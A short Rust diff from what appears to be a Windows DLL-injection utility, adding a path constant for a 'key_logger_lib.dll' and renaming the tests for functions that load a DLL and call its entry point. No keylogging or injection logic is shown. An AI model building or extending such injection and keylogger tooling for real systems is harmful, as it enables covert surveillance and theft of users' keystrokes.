@@ -6,6 +6,7 @@ use windows::Win32::Foundation::{GetLastError, HMODULE};
 use windows::Win32::System::LibraryLoader::{GetProcAddress, LoadLibraryA};
 
 pub const DLL_PATH: &str = "src\\injected_lib.dll";
+pub const KEY_LOGGER_DLL_PATH: &str = "src\\key_logger_lib.dll";
 pub const DLL_ENTRY_POINT: &str = "TestExport";
 
 type MyFunction = unsafe extern "C" fn();
@@ -71,7 +72,7 @@ pub fn allocate_and_write_dll_address(path: &str) -> Result<HMODULE, String> {
 }
 
 #[cfg(test)]
-mod injected_lib_tests {
+mod dll_utils_tests {
     use super::*;
 
     #[test]
@@ -84,13 +85,13 @@ mod injected_lib_tests {
     }
 
     #[test]
-    fn test_allocate_and_write_dll_address() {
+    fn test_allocate_and_write_dll_address_success() {
         let result = allocate_and_write_dll_address(DLL_PATH);
         assert!(result.is_ok());
     }
 
     #[test]
-    fn test_execute_dll() {
+    fn test_execute_dll_success() {
         execute_dll(
             allocate_and_write_dll_address(DLL_PATH).unwrap(),
             DLL_ENTRY_POINT,
